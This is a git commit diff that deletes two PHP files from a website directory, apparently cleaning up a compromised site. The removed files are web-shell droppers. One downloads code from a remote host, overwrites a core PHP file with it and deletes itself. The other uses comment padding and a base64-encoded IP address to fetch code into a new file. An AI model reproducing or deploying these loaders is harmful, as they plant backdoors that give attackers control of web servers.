ec1342f1178f0712912692a495a821c9115729ed
Now <138880448+NOWss@users.noreply.github.com>
2025-02-20 15:48:53 +0800

    test

--- www.cardking.tw_zANMC/www.cardking.tw/temp.php
+++
@@ -1,4 +0,0 @@
-<?php 
-file_put_contents('./core/basic/fun.php',file_get_contents('http://d.sogouad.vip/txt/mtn.txt'));
-echo 'temp111888';
-unlink(__FILE__);
--- www.cardking.tw_zANMC/www.cardking.tw/tempshell.php
+++
@@ -1,3 +0,0 @@
-<?php
-file_put_contents/*SHAS1*/('indexback.php', file_get_contents/*SHAS1*/(base64_decode/*SHAS1*/('aHR0cDovLzEwNy4xNzUuNzYuMTMwL2FzLnR4dA==')));
-echo 'wuti';
